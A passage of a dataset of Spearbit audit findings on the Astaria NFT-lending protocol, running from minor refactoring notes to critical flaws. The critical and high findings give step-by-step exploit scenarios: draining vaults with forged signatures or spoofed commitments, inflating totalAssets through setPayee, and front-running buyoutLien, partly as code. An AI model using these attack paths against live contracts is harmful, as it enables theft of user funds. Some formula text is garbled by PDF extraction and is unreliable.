instance, _validateRequest() can be made view. getSeaportMetadata() can be made pure instead of view.", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "Fix compiler generated warnings for unused arguments", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf", "body": "Several functions have arguments which are not used and compiler generates a warning for each instance, cluttering the output. This makes it easy to miss useful warnings. Here is one example of a function with unused arguments: function deposit( uint256 assets, address receiver ) { } public virtual override(ERC4626Cloned, IERC4626) onlyVault returns (uint256 shares) revert NotSupported();", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "Non-lien NFT tokens can get locked in the vaults", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf", "body": "Both public and private vault when their onERC721Received(...) is called they return the IERC721Receiver.onERC721Received.selector and perform extra logic if the msg.sender is the LienToken and the operator is the AstariaRouter. This means other NFT tokens (other than lien tokens) received by a vault will be locked.", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "Validation checks should be performed at the beginning of processEpoch()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf", "body": "The following validation check for the data corresponding to the current epoch happens in the middle of processEpoch() where there have already been some accounting done: if (s.epochData[s.currentEpoch].liensOpenForEpoch > 0) { revert InvalidVaultState( InvalidVaultStates.LIENS_OPEN_FOR_EPOCH_NOT_ZERO ); }", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "Define and onlyOwner modifier for VaultImplementation", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf", "body": "The following require statement has been used multiple times require(msg.sender == owner());", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "Vault is missing an interface", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf", "body": "Vault is missing an interface", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "RepaymentHelper.makePayment(...) transfer is used", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf", "body": "In RepaymentHelper.makePayment(...) the transfer function is used to return extra native tokens sent to this contract. The use of transfer which restrict the amount of gas shared with the msg.sender is not required, since there are no actions after this call site, it is safe to call the msg.sender directly to transfer these funds.", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "Consider importing Uniswap libraries directly", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf", "body": "astaria-gpl copies the libraries highlighted above which were written originally in Solidity v0.7 and refactors them to v0.8. Uniswap has also provided these contracts for Solidity v0.8 in branches named 0.8. See v3-core@0.8 and v3-periphery@0.8. Using these files directly reduces the amount of code owned by Astaria.", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "Elements' orders are not consistent in solidity files", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf", "body": "Elements' orders are not consistent in solidity files", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "FileType definitions are not consistent", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf", "body": "Both ICollateralToken.FileType and ILienToken.FileType start their enums with NotSupported. The definition of FileType in IAstariaRouter is not consistent with that pattern. This might be due to having 0 as a NotSupported so that the file endpoints would revert.", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "VIData.allowlist can transfer shares to entities not on the allowlist", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf", "body": "allowList is only used to restrict the share recipients upon mint or deposit to a vault if allowLis- tEnabled is set to true. These shareholders can later transfer their share to other users who might not be on the allowList.", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "Extract common struct fields from IStrategyValidator implementations", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf", "body": "All the IStrategyValidator implementations have the following data encoded in the NewLienRe- quest.nlrDetails struct CommonData { uint8 version; address token; // LP token for Uni_V3... address borrower; ILienToken.Details lienDetails; bytes moreData; // depends on each implementation }", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "_createLien() takes in an extra argument", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf", "body": "_createLien(LienStorage storage s, ...) doesn't use s and hence can be removed as an argument.", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "unchecked has no effect", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf", "body": "unchecked only affects the arithmetic operations directly nested under it. In this case unchecked is unnecessary: unchecked { s.yIntercept = (_totalAssets(s)); s.last = block.timestamp.safeCastTo40(); }", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "Multicall can reuse msg.value", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf", "body": "A delegatecall forwards the same value for msg.value as found in the current context. Hence, all delegatecalls in a loop use the same value for msg.value. In the case of these calls using msg.value, it has the ability to use the native token balance of the contract itself for (uint256 i = 0; i < data.length; i++) { (bool success, bytes memory result) = address(this).delegatecall(data[i]); ... }", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "Authorised entities can drain user assets", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf", "body": "An authorized entity can steal user approved tokens (vault assets and vault tokens, ...) using these endpoints 58 function tokenTransferFrom( address token, address from, address to, uint256 amount ) external requiresAuth { ERC20(token).safeTransferFrom(from, to, amount); } function tokenTransferFromWithErrorReceiver( address token, address from, address to, uint256 amount ) external requiresAuth { try ERC20(token).transferFrom(from, to, amount) {} catch { _transferToErrorReceiver(token, from, to, amount); } } Same risk applies to all the other upgradable contracts.", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "Conditional statement in _validateSignature(...) can be simplified/optimized", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf", "body": "When validating the vault strategist's (or delegate's) signature for the commitment, we perform the following check if ( (recovered != strategist && recovered != delegate) || recovered == address(0) ) { revert IVaultImplementation.InvalidRequest( IVaultImplementation.InvalidRequestReason.INVALID_SIGNATURE ); } The conditional statement: (recovered != strategist && recovered != delegate) 59 perhaps can be optimised/simplified.", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "AstariaRouter cannot deposit into private vaults", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf", "body": "The allowlist for private vaults only includes the private vault's owner function newVault( address delegate, address underlying ) external whenNotPaused returns (address) { address[] memory allowList = new address[](1); allowList[0] = msg.sender; RouterStorage storage s = _loadRouterSlot(); ... } Note that for private vaults we cannot modify or disable/enable the allowlist. includes the owner. It is always enabled and only That means only the owner can deposit into the private vault function deposit( uint256 amount, address receiver ) public virtual whenNotPaused returns (uint256) { VIData storage s = _loadVISlot(); require(s.allowList[msg.sender] && receiver == owner()); ... } If we the owner would like to be able to use the AstariaRouter's interface by calling its deposit(...), or de- positToVault(...) endpoint (which uses the pulling strategy from transfer proxy), it would not be able to. Anyone can directly transfer tokens to this private vault by calling asset() directly. So above requirement re- quire(s.allowList[msg.sender] ... ) seems to also be there to avoid potential mistakes when one is calling the ERC4626RouterBase.deposit(...) endpoint to deposit into the vault indirectly using the router.", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "Reorganise sanity/validity checks in the commitToLien(...) flow", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf", "body": "The following checks are preformed in _validateRequest(...):  params.lienRequest.amount == 0: if (params.lienRequest.amount == 0) { revert ILienToken.InvalidLienState( ILienToken.InvalidLienStates.AMOUNT_ZERO ); } The above check can be moved to the very beginning of the commitToLien(...) flow. Perhaps right before or after we check the commitment's vault provided is valid.  newStack.lien.details.duration < s.minLoanDuration can be checked right after we compare to time to the second epoch end: if (publicVault.supportsInterface(type(IPublicVault).interfaceId)) { uint256 timeToSecondEpochEnd = publicVault.timeToSecondEpochEnd(); require(timeToSecondEpochEnd > 0, \"already two epochs ahead\"); if (timeToSecondEpochEnd < lien.details.duration) { lien.details.duration = timeToSecondEpochEnd; } } if (lien.details.duration < s.minLoanDuration) { revert ILienToken.InvalidLienState( ILienToken.InvalidLienStates.MIN_DURATION_NOT_MET ); } This only works if we assume the LienToken.createLien(...) endpoint does not change the duration. The current implementation does not.  block.timestamp > params.lienRequest.strategy.deadline can also be checked at the very beginning of the commitToLien flow.", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "Refactor fetching strategyValidator", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf", "body": "Both _validateCommitment(...) and getStrategyValidator(...) need to fetch strategyVal- idator and both use the same logic.", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "The stack provided as an extra data to settle Seaport auctions need to be retrievable", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf", "body": "The stack provided as an extra data to settle Seaport auctions need to be retrievable. Perhaps one can figure this from various events or off-chain agents, but it is not directly retrievable.", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "Make sure CollateralToken is connected to Seaport v1.5", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf", "body": "Currently the CollateralToken proxy (v0) is connected to Seaport v1.1 which has different call- backs to the zone and it also only performs static calls. If the current version of CollateralToken gets connected to the Seaport v1.1, no one would be able to settle auctions created by the CollateralToken. This is due to the fact that the callbacks would revert.", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "LienToken.transferFrom does not update a public vault's bookkeeping parameters when a lien is transferred to it.", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "When transferFrom is called, there is not check whether the from or to parameters could be a public vault. Currently, there is no mechanism for public vaults to transfer their liens. But private vault owners who are also owners of the vault's lien tokens, they can call transferFrom and transfer their liens to a public vault. In this case, we would need to make sure to update the bookkeeping for the public vault that the lien was transferred to. On the LienToken side, s.LienMeta[id].payee needs to be set to the address of the public vault. And on the PublicVault side, yIntercept, slope, last, epochData of VaultData need to be updated (this requires knowing the lien's end). However, private vaults do not keep a record of these values, and the corresponding values are only saved in stacks off-chain and validated on-chain using their hash.", "labels": ["Spearbit", "Astaria", "Severity: Critical Risk"]}, {"title": "Anyone can take a valid commitment combined with a self-registered private vault to steal funds from any vault without owning any collateral", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "The issue stems from the following check in VaultImplementation._validateCommitment(params, receiver): if ( msg.sender != holder && receiver != holder && receiver != operator && !ROUTER().isValidVault(receiver) // <-- the problematic condition ) { ... In this if block if receiver is a valid vault the body of the if is skipped. A valid vault is one that has been registered in AstariaRouter using newVault or newPublicVault. So for example any supplied private vault as a receiver would be allowed here and the call to _validateCommitment will continue without reverting at least in this if block. If we backtrack function calls to _validateCommitment, we arrive to 3 exposed endpoints:  commitToLiens  buyoutLien  commitToLien A call to commitToLiens will end up having the receiver be the AstariaRouter. A call to buyoutLien will set the receiver as the recipient() for the vault which is either the vault itself for public vaults or the owner for private vaults. So we are only left with commitToLien, where the caller can set the value for the receiver directly. 8 A call to commitToLien will initiate a series of function calls, and so receiver is only supplied to _validateCommit- ment to check whether it is allowed to be used and finally when transferring safeTransfer) wETH. This opens up exploiting scenarios where an attacker: 1. Creates a new private vault by calling newVault, let's call it V . 2. Takes a valid commitment C and combines it with V and supply those to commitToLien. 3. Calls withdraw endpoint of V to withdraw all the funds. For step 2. the attacker can source valid commitments by doing either of the following: 1. Frontrun calls to commitToLiens and take all the commitments C0, (cid:1) (cid:1) (cid:1) , Cn and supply them one by one along with V to commitToLien endpoint of the vault that was specified by each Ci . 2. Frontrun calls to commitToLien endpoints of vaults, take their commitment C and combine it with V to send to commitToLien. 3. Backrun the either scenarios from the above points and create a new commitment with new lien request that tries to max out the potential debt for a collateral while also keeping other inequalities valid (for example, the inequality regarding liquidationInitialAsk).", "labels": ["Spearbit", "Astaria", "Severity: Critical Risk"]}, {"title": "Collateral owner can steal funds by taking liens while asset is listed for sale on Seaport", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "We only allow collateral holders to call listForSaleOnSeaport if they are listing the collateral at a price that is sufficient to pay back all of the liens on their collateral. When a new lien is created, we check that collateralStateHash != bytes32(\"ACTIVE_AUCTION\") to ensure that the collateral is able to accept a new lien. However, calling listForSaleOnSeaport does not set the collateralStateHash, so it doesn't stop us from taking new liens. As a result, a user can deposit collateral and then, in one transaction:  List the asset for sale on Seaport for 1 wei.  Take the maximum possible loans against the asset.  Buy the asset on Seaport for 1 wei. The 1 wei will not be sufficient to pay back the lenders, and the user will be left with the collateral as well as the loans (minus 1 wei).", "labels": ["Spearbit", "Astaria", "Severity: Critical Risk"]}, {"title": "validateStack allows any stack to be used with collateral with no liens", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "The validateStack modifier is used to confirm that a stack entered by a user matches the stateHash in storage. However, the function reverts under the following conditions: if (stateHash != bytes32(0) && keccak256(abi.encode(stack)) != stateHash) { revert InvalidState(InvalidStates.INVALID_HASH); } The result is that any collateral with stateHash == bytes32(0) (which is all collateral without any liens taken against it yet) will accept any provided stack as valid. This can be used in a number of harmful ways. Examples of vulnerable endpoints are:  createLien: If we create the first lien but pass a stack with other liens, those liens will automatically be included in the stack going forward, which means that the collateral holder will owe money they didn't receive.  makePayment: If we make a payment on behalf of a collateral with no liens, but include a stack with many liens (all owed to me), the result will be that the collateral will be left with the remaining liens continuing to be owed  buyoutLien: Anyone can call buyoutLien(...) and provide parameters that are spoofed but satisfy some constraints so that the call would not revert. This is currently possible due to the issue in this context. As a consequence the caller can  _mint any unminted liens which can DoS the system.  _burn lienIds that they don't have the right to remove.  manipulate any public vault's storage (if it has been set as a payee for a lien) through its handleBuyout- Lien. It seems like this endpoint might have been meant to be a restricted endpoint that only registered vaults can call into. And the caller/user is supposed to only call into here from VaultImplementa- tion.buyoutLien.", "labels": ["Spearbit", "Astaria", "Severity: Critical Risk"]}, {"title": "A borrower can list their collateral on Seaport and receive almost all the listing price without paying back their liens", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "When the collateral s.auctionData is not populated and thus, function gets called since stack.length is 0, this loop will not run and no payment is sent to the lending vaults. The rest of the payment is sent to the borrower. And the collateral token and its related data gets burnt/deleted by calling settleAuction. The lien tokens and the vaults remain untouched as though nothing has happened. is listed on SeaPort by the borrower using listForSaleOnSeaport, if that order gets fulfilled/matched and ClearingHouse's fallback So basically a borrower can: 1. Take/borrow liens by offering a collateral. 2. List their collateral on SeaPort through the listForSaleOnSeaport endpoint. 3. Once/if the SeaPort order fulfills/matches, the borrower would be paid the listing price minus the amount sent to the liquidator (address(0) in this case, which should be corrected). 4. Collateral token/data gets burnt/deleted. 5. Lien token data remains and the loans are not paid back to the vaults. And so the borrower could end up with all the loans they have taken plus the listing price from the SeaPort order. Note that when a user lists their own collateral on Seaport, it seems that we intentionally do not kick off the auction process:  Liens are continued.  Collateral state hash is unchanged.  liquidator isn't set.  Vaults aren't updated.  Withdraw proxies aren't set, etc. Related issue 88.", "labels": ["Spearbit", "Astaria", "Severity: Critical Risk"]}, {"title": "Phony signatures can be used to forge any strategy", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "In _validateCommitment(), we check that the merkle root of the strategy has been signed by the strategist or delegate. After the signer is recovered, the following check is performed to validate the signature: recovered != owner() && recovered != s.delegate && recovered != address(0) 11 This check seems to be miswritten, so that any time recovered == address(0), the check passes. When ecrecover is used to check the signed data, it returns address(0) in the situation that a phony signature is submitted. See this example for how this can be done. The result is that any borrower can pass in any merkle root they'd like, sign it in a way that causes address(0) to return from ecrecover, and have their commitment validated.", "labels": ["Spearbit", "Astaria", "Severity: Critical Risk"]}, {"title": "Inequalities involving liquidationInitialAsk and potentialDebt can be broken when buyoutLien is called", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "When we commit to a new lien, the following gets checked to be true for all j 2 0, (cid:1) (cid:1) (cid:1) , n (cid:0) 1: onew + on(cid:0)1 + (cid:1) (cid:1) (cid:1) + oj (cid:20) Lj where: parameter description oi onew n Li L0 k k A0 k _getOwed(newStack[i], newStack[i].point.end) _getOwed(newSlot, newSlot.point.end) stack.length newStack[i].lien.details.liquidationInitialAsk params.encumber.lien.details.liquidationInitialAsk params.position params.encumber.amount 12 so in a stack in general we should have the: But when an old lien is replaced with a new one, we only perform the following checks for L0 k : (cid:1) (cid:1) (cid:1) + oj+1 + oj (cid:20) Lj 0 0 0 k ^ L k (cid:21) A L k > 0 And thus we can introduce:  L0  o0 k (cid:28) Lk or k (cid:29) ok (by pushing the lien duration) which would break the inequality regarding oi s and Li . If the inequality is broken, for example, if we buy out the first lien in the stack, then if the lien expires and goes into a Seaport auction the auction's starting price L0 would not be able to cover all the potential debts even at the beginning of the auction.", "labels": ["Spearbit", "Astaria", "Severity: High Risk"]}, {"title": "VaultImplementation.buyoutLien can be DoSed by calls to LienToken.buyoutLien (cid:1) (cid:1) (cid:1) + oj+1 + oj (cid:20) Lj", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "Anyone can call into LienToken.buyoutLien and provide params of the type LienActionBuyout: params.incoming is not used, so for example vault signatures or strategy validation is skipped. There are a few checks for params.encumber. Let's define the following variables: parameter value i kj tj ej e0 i lj l 0 i rj r 0 i c params.position params.encumber.stack[j].point.position params.encumber.stack[j].point.last params.encumber.stack[j].point.end tnow + D0 i params.encumber.stack[j].point.lienId i )) where h is the keccak256 of the encoding i , r 0 i , c0 i , S0 i , D0 i , V 0 i , (A0max h(N 0 i , P 0 i , L0 params.encumber.stack[j].lien.details.rate : old rate params.encumber.lien.details.rate : new rate params.encumber.collateralId 13 parameter value cj c0 i Aj A0 i Amax j A0max i R Nj N 0 i Vj V 0 i Sj S0 i Dj D0 i Pj P0 i Lj L0 i Imin Dmin tnow bi o oj n params.encumber.stack[j].lien.collateralId params.encumber.lien.collateralId params.encumber.stack[j].point.amount params.encumber.amount params.encumber.stack[j].lien.details.maxAmount params.encumber.lien.details.maxAmount params.encumber.receiver params.encumber.stack[j].lien.token params.encumber.lien.token params.encumber.stack[j].lien.vault params.encumber.lien.vault params.encumber.stack[j].lien.strategyRoot params.encumber.lien.strategyRoot params.encumber.stack[j].lien.details.duration params.encumber.lien.details.duration params.encumber.stack[j].lien.details.maxPotentialDebt params.encumber.lien.details.maxPotentialDebt params.encumber.stack[j].lien.details.liquidationInitialAsk params.encumber.lien.details.liquidationInitialAsk AstariaRouter.s.minInterestBPS AstariaRouter.s.minDurationIncrease block.timestamp buyout _getOwed(params.encumber.stack[params.position], block.timestamp) _getOwed(params.encumber.stack[j], params.encumber.stack[j].point.end) params.encumber.stack.length O = o0 + o1 + (cid:1) (cid:1) (cid:1) + on(cid:0)1 _getMaxPotentialDebtForCollateral(params.encumber.stack) sj s0 i params.encumber.stack[j] newStack Let's go over the checks and modifications that buyoutLien does: 1. validateStack is called to make sure that the hash of params.encumber.stack matches with s.collateralStateHash value of c. This is not important and can be bypassed by the exploit even after the fix for Issue 106. 2. _createLien is called next which does the following checks: 2.1. c is not up for auction. 2.2. We haven't reached max number of liens, currently set to 5. 2.3. L0 > 0 2.4. If params.encumber.stack is not empty then c0 i , (A0max i , L0 i )) where h is the hashing mechanism of encoding and then taking the keccak256. 2.6 The new stack slot and i = c0 2.5. We _mint a new lien for R with id equal to h(N 0 i and L0 i (cid:21) A0 i , V 0 i , D0 i , S0 i , P 0 i , c0 , r 0 i i 14 the new lien id is returned. 3. isValidRefinance is called which performs the following checks: 3.1. checks c0 i = c0 3.2. checks either or (r 0 i < ri (cid:0) Imin) ^ (e0 i (cid:21) ei ) i i (cid:20) ri ) ^ (e0 (r 0 is in auction by checking s.collateralStateHash's value. i (cid:21) ei + Dmin) 4. check where c0 i 5. check O (cid:20) P0 i . 6. check A0max (cid:21) o. 7. send wETH through TRANSFER_PROXY from msg.sender to payee of li with the amount of bi . 8. if payee of li is a public vault, do some book keeping by calling handleBuyoutLien. 9. call _replaceStackAtPositionWithNewLien to:  9.1. replace si with s0  9.2. _burn li .  9.3. delete s.lienMeta of li . i in params.encumber.stack. So in a nutshell the important checks are:  c, ci are not in auction (not important for the exploit)  c0 i = c0 i and L0  n is less than or equal to max number of allowed liens ( 5 currently) (not important for the exploit)  L0 i (cid:21) A0  O (cid:20) P0 i  A0max i > 0 (cid:21) o i or (r 0 i < ri (cid:0) Imin) ^ (e0 i (cid:21) ei ) i (cid:20) ri ) ^ (e0 (r 0 i (cid:21) ei + Dmin) Exploit An attacker can DoS the VaultImplementation.buyoutLien as follows: 1. A vault decides to buy out a collateral's lien to offer better terms and so signs a commitment and some- one on behalf of the vault calls VaultImplementation.buyoutLien which if executed would call LienTo- ken.buyoutLien with the following parameters: 15 LienActionBuyout({ incoming: incomingTerms, position: position, encumber: ILienToken.LienActionEncumber({ collateralId: collateralId, amount: incomingTerms.lienRequest.amount, receiver: recipient(), lien: ROUTER().validateCommitment({ commitment: incomingTerms, timeToSecondEpochEnd: _timeToSecondEndIfPublic() }), stack: stack }) }) 2. The attacker fronrun the call from step 1. and instead provide the following modified parameters to LienTo- ken.buyoutLien LienActionBuyout({ incoming: incomingTerms, // not important, since it is not used and can be zeroed-out to save tx gas position: position, encumber: ILienToken.LienActionEncumber({ collateralId: collateralId, amount: incomingTerms.lienRequest.amount, receiver: msg.sender, // address of the attacker lien: ILienToken.Lien({ // note that the lien here would have the same fields as the original message by the vault rep. ,! token: address(s.WETH), vault: incomingTerms.lienRequest.strategy.vault, // address of the vault offering a better term strategyRoot: incomingTerms.lienRequest.merkle.root, collateralId: collateralId, details: details // see below }), stack: stack }) }) Where details provided by the attacker can be calculated by using the below snippet: uint8 nlrType = uint8(_sliceUint(commitment.lienRequest.nlrDetails, 0)); (bytes32 leaf, ILienToken.Details memory details) = IStrategyValidator( s.strategyValidators[nlrType] ).validateAndParse( commitment.lienRequest, s.COLLATERAL_TOKEN.ownerOf( commitment.tokenContract.computeId(commitment.tokenId) ), commitment.tokenContract, commitment.tokenId ); The result is that:  The newLienId that was supposed to be _minted for the recipient() of the vault, gets minted for the at- tacker.  The call to VaultImplementation.buyoutLien would fail, since the newLienId is already minted, and so the vault would not be able to receives the interests it had anticipated.  When there is a payment or Seaport auction settlement, the attacker would receive the funds instead. 16  The attacker can intorduces a malicous contract into the protocol ken.ownerOf(newLienId) without needing to register for a vault. that would be LienTo- To execute this attack, the attacker would need to spend the buyout amount of assets. Also the attacker does not necessarily need to front run a transaction to buyout a lien. They can pick their own hand-crafted parameters that would satisfy the conditions in the analysis above to introduce themselves in the protocol.", "labels": ["Spearbit", "Astaria", "Severity: High Risk"]}, {"title": "VaultImplementation.buyoutLien does not update the new public vault's parameters and does not transfer assets between the vault and the borrower", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "VaultImplementation.buyoutLien does not update the accounting for the vault (if it's public). The slope, yIntercept, and s.epochData[...].liensOpenForEpoch (for the new lien's end epoch) are not updated. They are updated for the payee of the swapped-out lien if the payee is a public vault by calling handleBuyoutLien. Also, the buyout amount is paid out by the vault itself. The difference between the new lien amount and the buyout amount is not worked out between the msg.sender and the new vault.", "labels": ["Spearbit", "Astaria", "Severity: High Risk"]}, {"title": "setPayee doesn't update y intercept or slope, allowing vault owner to steal all funds", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "When setPayee() is called, the payment for the lien is no longer expected to go to the vault. How- ever, this change doesn't impact the vault's y-intercept or slope, which are used to calculate the vault's totalAs- sets(). This can be used maliciously by a vault owner to artificially increase their totalAssets() to any arbitrary amount:  Create a lien from the vault.  SetPayee to a non-vault address.  Buyout the lien from another vault (this will cause the other vault's y-int and slope to increase, but will not impact the y-int and slope of the original vault because it'll fail the check on L165 that payee is a public vault.  Repeat the process again going the other way, and repeat the full cycle until both vault's have desired totalAssets(). For an existing vault, a vault owner can withdraw a small amount of assets each epoch. If, in any epoch, they are one of the only users withdrawing funds, they can perform this attack immediately before the epoch is pro- cessed. The result is that the withdrawal shares will by multiplied by totalAssets() / totalShares() to get the withdrawal rate, which can be made artificially high enough to wipe out the entire vault.", "labels": ["Spearbit", "Astaria", "Severity: High Risk"]}, {"title": "settleAuction() doesn't check if the auction was successful", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "settleAuction() is a privileged functionality called by LienToken.payDebtViaClearingHouse(). settleAuction() is intended to be called on a successful auction, but it doesn't verify that that's indeed the case. Anyone can create a fake Seaport order with one of its considerations set as the CollateralToken as described in Issue 93. Another potential issue is if the Seaport orders can be \"Restricted\" in future, then there is a possibility for an authorized entity to force settleAuction on CollateralToken, and when SeaPort tries to call back on the zone to validate it would fail.", "labels": ["Spearbit", "Astaria", "Severity: High Risk"]}, {"title": "Incorrect auction end validation in liquidatorNFTClaim()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "liquidatorNFTClaim() does the following check to recognize that Seaport auction has ended: if (block.timestamp < params.endTime) { //auction hasn't ended yet revert InvalidCollateralState(InvalidCollateralStates.AUCTION_ACTIVE); } Here, params is completely controlled by users and hence to bypass this check, the caller can set params.endTime to be less than block.timestamp. Thus, a possible exploit scenario occurs when AstariaRouter.liquidate() is called to list the underlying asset on Seaport which also sets liquidator address. Then, anyone can call liquidatorNFTClaim() to transfer the underlying asset to liquidator by setting params.endTime < block.timestamp.", "labels": ["Spearbit", "Astaria", "Severity: High Risk"]}, {"title": "Typed structured data hash used for signing commitments is calculated incorrectly", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "Since STRATEGY_TYPEHASH == keccak256(\"StrategyDetails(uint256 nonce,uint256 deadline,bytes32 root)\") The hash calculated in _encodeStrategyData is incorrect according to EIP-712. s.strategistNonce is of type uint32 and the nonce type used in the type hash is uint256. Also the struct name used in the typehash collides with StrategyDetails struct name defined as: 19 struct StrategyDetails { uint8 version; uint256 deadline; address vault; }", "labels": ["Spearbit", "Astaria", "Severity: High Risk"]}, {"title": "makePayment doesn't properly update stack, so most payments don't pay off debt", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "As we loop through individual payment in _makePayment, each is called with: (newStack, spent) = _payment( s, stack, uint8(i), totalCapitalAvailable, address(msg.sender) ); This call returns the updated stack as newStack but then uses the function argument stack again in the next iteration of the loop. The newStack value is unused until the final iterate, when it is passed along to _updateCollateralStateHash(). This means that the new state hash will be the original state with only the final loan repaid, even though all other loans have actually had payments made against them.", "labels": ["Spearbit", "Astaria", "Severity: High Risk"]}, {"title": "_removeStackPosition() always reverts", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "removeStackPosition() always reverts since it calls stack array for an index beyond its length: for (i; i < length; ) { unchecked { newStack[i] = stack[i + 1]; ++i; } } Notice that for i==length-1, stack[length] is called. This reverts since length is the length of stack array. Additionally, the intention is to delete the element from stack at index position and shift left the elements ap- pearing after this index. However, an addition increment to the loop index i results in newStack[position] being empty, and the shift of other elements doesn't happen.", "labels": ["Spearbit", "Astaria", "Severity: High Risk"]}, {"title": "Refactor _paymentAH()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "_paymentAH() has several vulnerabilities:  stack is a memory parameter. So all the updates made to stack are not applied back to the corresponding storage variable.  No need to update stack[position] as it's deleted later.  decreaseEpochLienCount() is always passed 0, as stack[position] is already deleted. Also decreaseEp- ochLienCount() expects epoch, but end is passed instead.  This if/else block can be merged. updateAfterLiquidationPayment() expects msg.sender to be LIEN_- TOKEN, so this should work.", "labels": ["Spearbit", "Astaria", "Severity: High Risk"]}, {"title": "processEpoch() needs to be called regularly", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "If the processEpoch() endpoint does not get called regularly (especially close to the epoch bound- aries), the updated currentEpoch would lag behind the actual expected value and this will introduce arithmetic errors in formulas regarding epochs and timestamps.", "labels": ["Spearbit", "Astaria", "Severity: High Risk"]}, {"title": "Can create lien for collateral while at auction by passing spoofed data", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "In the createLien function, we check that the collateral isn't currently at auction before giving a lien with the following check: if ( s.collateralStateHash[params.collateralId] == bytes32(\"ACTIVE_AUCTION\") ) { revert InvalidState(InvalidStates.COLLATERAL_AUCTION); } However, collateralId is passed in multiple places in the params: params.encumber.lien. both in params directly and in 23 The params.encumber.lien.collateralId is used everywhere else, 